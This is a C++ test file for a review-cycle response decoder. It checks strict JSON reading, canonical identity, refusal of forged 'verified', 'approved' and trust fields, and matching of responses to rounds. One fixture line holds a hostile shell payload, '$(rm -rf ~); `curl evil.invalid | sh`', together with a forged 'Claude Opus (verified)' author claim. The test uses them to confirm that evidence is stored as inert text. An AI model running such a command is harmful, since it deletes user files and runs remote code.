#include "bpr/core/review_cycle_response.hpp"

#include <array>
#include <cstdint>
#include <cstdlib>
#include <filesystem>
#include <fstream>
#include <iostream>
#include <iterator>
#include <string>
#include <string_view>
#include <utility>
#include <vector>

/// \file
/// \brief Recipient responses and manual replies (BPR-1164): strict reading of
/// the pack's `response.json`, canonical identity, forged authority, inert
/// evidence, correlation with the exact round, and item statements that never
/// invent a missing response.

namespace {
	using namespace bpr::core;

	void expect(const bool aValue, const char* aWhat)
	{
		if (!aValue) {
			std::cerr << "review cycle response failure: " << aWhat << '\n';
			std::exit(EXIT_FAILURE);
		}
	}

	auto read_file(const std::filesystem::path& aPath) -> std::string
	{
		auto stream = std::ifstream{ aPath, std::ios::binary };
		expect(static_cast<bool>(stream), "example readable");
		return { std::istreambuf_iterator<char>{ stream }, std::istreambuf_iterator<char>{ } };
	}

	auto replaced(std::string aText, const std::string_view aFrom, const std::string_view aTo) -> std::string
	{
		const auto at = aText.find(aFrom);
		expect(at != std::string::npos, "fixture text present");
		aText.replace(at, aFrom.size(), aTo);
		return aText;
	}

	auto problem(const std::string& aDocument) -> cycle_response_decode_problem
	{
		const auto decoded = decode_response_document(aDocument);
		expect(!decoded.has_value(), "document refused");
		return decoded.error().Problem;
	}

	void reads_the_pack_response(const std::string& aResponse, const cycle_decoded_round& aRound)
	{
		const auto decoded = decode_response_document(aResponse);
		expect(decoded.has_value(), "the pack's response.json is admitted");
		const auto& document = decoded->Document;
		expect(document.ResponseId == "RESP-1" && document.CycleId == "RC-17" && document.RoundId == "F1" && !document.ResultRevision, "identities as sent");
		expect(document.ClaimedAuthor.DisplayName == "Example recipient" && document.ClaimedAuthor.Kind == cycle_claimed_author_kind::human && !document.ClaimedAuthor.Model, "claimed author kept as claimed");
		expect(document.Entries.size() == 1U && document.Entries[0].Item == "I5" && document.Entries[0].ItemRevision == 1U && document.Entries[0].Disposition == cycle_response_disposition::discussion_only,
			   "one entry");
		expect(!check_response(document, aRound.Payload, aRound.Digest), "correlates with the pack's round");

		// Canonical identity: whitespace and key order do not change it; content does.
		auto spaced = std::string{ "  " } + aResponse + "\n";
		expect(decode_response_document(spaced)->Digest == decoded->Digest, "whitespace does not change identity");
		expect(decode_response_document(encode_response_document(document).value())->Canonical == decoded->Canonical, "the canonical form reads back to itself");
		const auto edited = replaced(aResponse, "No code or tests have been run.", "No code has been run.");
		expect(decode_response_document(edited)->Digest != decoded->Digest, "other content, other identity");

		// No field verifies, approves, publishes or grants anything.
		expect(problem(replaced(aResponse, "\"items\":", "\"verified\": true, \"items\":")) == cycle_response_decode_problem::shape, "a verification flag is refused");
		expect(problem(replaced(aResponse, "\"discussion_only\"", "\"verified\"")) == cycle_response_decode_problem::shape, "verified is not a disposition");
		expect(problem(replaced(aResponse, "\"disposition\"", "\"approved\": true, \"disposition\"")) == cycle_response_decode_problem::shape, "an item approval is refused");
		expect(problem(replaced(aResponse, "\"effort\": null", "\"effort\": null, \"trust\": \"high\"")) == cycle_response_decode_problem::shape, "a claimed trust rank is refused");
		expect(problem(replaced(aResponse, "\"kind\": \"text\"", "\"kind\": \"grant\"")) == cycle_response_decode_problem::shape, "no evidence kind grants anything");
		expect(problem(replaced(aResponse, "bpr.cycle.response.v1", "bpr.cycle.response.v2")) == cycle_response_decode_problem::version, "another version");
		expect(problem(replaced(aResponse, "\"RESP-1\"", "\"../RESP\"")) == cycle_response_decode_problem::identifier, "identifier pattern");
		expect(problem(replaced(aResponse, "\"item_revision\": \"1\"", "\"item_revision\": \"01\"")) == cycle_response_decode_problem::identifier, "revision pattern");
		expect(problem(replaced(aResponse, "061dd800", "061DD800")) == cycle_response_decode_problem::identifier, "digest pattern");
		expect(problem(replaced(aResponse, "\"items\": [", "\"items\": [{\"item_id\":\"I5\",\"item_revision\":\"1\",\"disposition\":\"addressed\",\"body\":\"x\",\"evidence\":[]},")) == cycle_response_decode_problem::duplicate,
			   "an item twice");
		expect(problem(replaced(aResponse, "\"schema\"", "\"schema\": \"x\", \"schema\"")) == cycle_response_decode_problem::json, "duplicate keys refused by the reader");
		expect(problem(replaced(aResponse, "Example recipient", "Example \xC3(recipient")) == cycle_response_decode_problem::json, "invalid UTF-8");
		expect(problem("[]") == cycle_response_decode_problem::shape, "not an object");

		// Correlation with the exact round.
		auto wrong    = document;
		wrong.CycleId = "RC-18";
		expect(check_response(wrong, aRound.Payload, aRound.Digest)->Problem == cycle_response_problem::wrong_cycle, "another cycle");
		wrong         = document;
		wrong.RoundId = "F2";
		expect(check_response(wrong, aRound.Payload, aRound.Digest)->Problem == cycle_response_problem::wrong_round, "another round");
		wrong             = document;
		wrong.RoundDigest = cycle_round_digest{ };
		expect(check_response(wrong, aRound.Payload, aRound.Digest)->Problem == cycle_response_problem::wrong_digest, "another round digest");
		wrong                  = document;
		wrong.Entries[0].Item  = "I9";
		const auto unknownItem = check_response(wrong, aRound.Payload, aRound.Digest);
		expect(unknownItem->Problem == cycle_response_problem::unknown_item && unknownItem->Entry == 0U, "an item the round does not hold");
		wrong                         = document;
		wrong.Entries[0].ItemRevision = 2U;
		expect(check_response(wrong, aRound.Payload, aRound.Digest)->Problem == cycle_response_problem::stale_item, "another revision of the item");
	}

	void keeps_evidence_inert(const std::string& aResponse)
	{
		const auto command           = std::string_view{ "$(rm -rf ~); `curl evil.invalid | sh`" };
		auto       document          = decode_response_document(aResponse)->Document;
		document.ClaimedAuthor.Kind  = cycle_claimed_author_kind::agent;
		document.ClaimedAuthor.Model = "Claude Opus (verified)";
		document.ResultRevision      = "R3";
		document.Entries[0].Evidence = { { .Kind = cycle_evidence_kind::text, .Value = std::string{ command } }, { .Kind = cycle_evidence_kind::test_report, .Value = "ctest: 100% tests passed" } };
		const auto canonical         = encode_response_document(document);
		expect(canonical.has_value(), "encoded");
		const auto again = decode_response_document(*canonical);
		expect(again && again->Document == document && again->Document.Entries[0].Evidence[0].Value == command, "evidence reads back as exactly the text sent");
		expect(again->Document.ClaimedAuthor.Model == "Claude Opus (verified)", "a claimed model stays a claim");
	}

	void replies_by_hand(const cycle_decoded_round& aRound)
	{
		const auto reply = cycle_manual_reply{ .RoundId = "F1", .From = "Dana (email)", .Items = { "I5" }, .Body = "Looked at the lock; left it for now.\r\n" };
		expect(!check_manual_reply(reply, aRound.Payload), "a prose reply about one item");
		expect(!check_manual_reply({ .RoundId = "F1", .Body = "Thanks, will do." }, aRound.Payload), "a reply about the round as a whole");
		expect(check_manual_reply({ .RoundId = "F1", .Body = " \r\n\t" }, aRound.Payload)->Problem == cycle_response_problem::empty, "a reply needs text");
		expect(check_manual_reply({ .RoundId = "F1", .Items = { "I99" }, .Body = "x" }, aRound.Payload)->Problem == cycle_response_problem::unknown_item, "an item the round does not hold");
		expect(check_manual_reply({ .RoundId = "F1", .Items = { "I5", "I5" }, .Body = "x" }, aRound.Payload)->Problem == cycle_response_problem::unknown_item, "an item twice");
		expect(check_manual_reply({ .RoundId = "F7", .Body = "x" }, aRound.Payload)->Problem == cycle_response_problem::wrong_round, "another round");
		const auto stored = encode_manual_reply(reply);
		expect(stored && decode_manual_reply(*stored) == reply, "the stored reply reads back exactly");
		expect(!decode_manual_reply(std::string{ " " } + *stored), "only the canonical form is a stored reply");
	}

	void states_what_each_item_was_told(const std::string& aResponse)
	{
		auto record = [](const std::uint64_t aId, const cycle_response_channel aChannel) {
			return cycle_response_record{ .Id = { .Cycle = review_cycle_id{ 1 }, .Id = cycle_response_id{ aId } }, .Round = cycle_round_id{ 1 }, .Channel = aChannel };
		};
		auto responses = std::vector<std::pair<cycle_response_record, cycle_response_content>>{ };
		responses.emplace_back(record(1, cycle_response_channel::response_file), decode_response_document(aResponse)->Document);
		responses.emplace_back(record(2, cycle_response_channel::manual_entry), cycle_manual_reply{ .RoundId = "F1", .From = "Dana", .Items = { "I5" }, .Body = "I disagree." });
		responses.emplace_back(record(3, cycle_response_channel::manual_entry), cycle_manual_reply{ .RoundId = "F1", .From = "Lee", .Body = "Overall fine." });
		const auto i5 = item_statements(responses, "I5");
		expect(i5.size() == 2U && i5[0].Channel == cycle_response_channel::response_file && i5[0].Disposition == cycle_response_disposition::discussion_only && i5[1].From == "Dana" && !i5[1].Disposition,
			   "two recipients' statements about one item, neither overwriting the other");
		expect(item_statements(responses, "I1").empty(), "an item nobody answered has no statement, not 'not attempted'");
	}

	void resolves_claimed_results()
	{
		auto authority = local_cycle_authority{ .Profile = bpr_profile_id{ 1 }, .Incarnation = cycle_catalog_incarnation{ std::array<std::uint8_t, 32>{ 1 } } };
		auto cycle     = create({ .Authority = authority }, { .Authority = authority, .Title = "Replies" })->Cycle;
		for (std::uint8_t material = 1; material <= 3; ++material) {
			auto bytes = std::array<std::uint8_t, 32>{ };
			bytes[0]   = material;
			cycle      = apply(cycle, { .Subject = cycle.Subject, .ExpectedRevision = cycle.Revision, .Change = record_cycle_capture{ .Capture = { .ScopeVersion = 1, .Material = cycle_material_digest{ bytes }, .Coverage = cycle_capture_coverage::complete } } }).Accepted;
		}
		expect(resolve_claimed_result(cycle, std::string{ "R2" }) == cycle_source_revision_id{ 2 }, "a captured revision resolves");
		expect(!resolve_claimed_result(cycle, std::string{ "R4" }) && !resolve_claimed_result(cycle, std::string{ "commit-abc123" }) && !resolve_claimed_result(cycle, std::nullopt), "anything else stays a reference");
	}
}

auto main(const int aCount, char** aArguments) -> int
{
	expect(aCount == 2, "usage: test <examples directory>");
	const auto examples = std::filesystem::path{ aArguments[1] };
	const auto round    = decode_round_envelope(read_file(examples / "round.json"));
	expect(round.has_value(), "the pack's round");
	const auto response = read_file(examples / "response.json");
	reads_the_pack_response(response, *round);
	keeps_evidence_inert(response);
	replies_by_hand(*round);
	states_what_each_item_was_told(response);
	resolves_claimed_results();
	std::cout << "review-cycle-response-tests:pass\n";
	return EXIT_SUCCESS;
}
